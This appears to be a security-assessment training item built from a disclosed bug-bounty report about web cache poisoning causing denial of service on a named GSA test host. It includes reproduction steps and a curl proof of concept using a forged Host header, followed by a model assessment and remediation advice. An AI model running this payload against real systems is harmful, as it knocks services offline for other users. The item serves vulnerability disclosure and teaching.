# CACHE_POISONING — h1

- source: h1
- class: cache_poisoning
- cwe: CWE-400
- severity: medium
- program: gsa_vdp
- quality_score: 11

## Scenario

Analyze the following vulnerability report and provide a structured security assessment.

**Report Title:** Web Cache Poisoning leading to DoS
**Affected Asset:** acquisition-uat.gsa.gov

**Vulnerability Description:**
A medium-severity vulnerability was found that could allow an attacker to exploit a cache_poisoning weakness. Specifically:

During security testing, the following issue was discovered:

## Summary:
`acquisition-uat.gsa.gov` is vulnerable to web cache poisoning that can lead to Denial of Service (DoS) in the application.

## Steps To Reproduce:
1. Visit https://acquisition-uat.gsa.gov/?letme=4449 to make sure the service is available.
*Note: `letme=4449` is used as cache buster as we do not want to poison the application without parameter.*
2. Poison the link using `curl` command
```
curl https://acquisition-uat.gsa.gov/\?letme\=4447 -H "Host: acquisition-uat.gsa.gov:8888"
```
3. Visit https://acquisition-uat.gsa.gov/?letme=4449 to verify that application is in the state of DoS as it attempts to make plenty of requests to `acquisition-uat.gsa.gov:8888`.

## Impact

The attacker can carry out web cache poisoning to prevent others from accessing the application.

Classification: Uncontrolled Resource Consumption

The root weakness is Uncontrolled Resource Consumption.

**Steps to Reproduce:**
1. Visit https://acquisition-uat.gsa.gov/?letme=4449 to make sure the service is available.
*Note: `letme=4449` is used as cache buster as we do not want to poison the application without parameter.*
2. Poison the link using `curl` command
```
curl https://acquisition-uat.gsa.gov/\?letme\=4447 -H "Host: acquisition-uat.gsa.gov:8888"
```
3. Visit https://acquisition-uat.gsa.gov/?letme=4449 to verify that application is in the state of DoS as it attempts to make plenty of requests to `acquisition-uat.gsa.gov:8888`.

**Proof of Concept:**
```
curl https://acquisition-uat.gsa.gov/\?letme\=4447 -H "Host: acquisition-uat.gsa.gov:8888"
```

## Analysis / Response

**Vulnerability Class:** cache_poisoning
**CWE:** CWE-400
**Weakness:** Uncontrolled Resource Consumption
**Severity:** medium
**Endpoint Pattern:** https://acquisition-uat.gsa.gov/?letme=4449

**Impact Assessment:**
The attacker can carry out web cache poisoning to prevent others from accessing the application.

**Remediation:**
Include all relevant headers in cache keys. Validate and normalize cache-influencing headers. Use Vary headers appropriately.
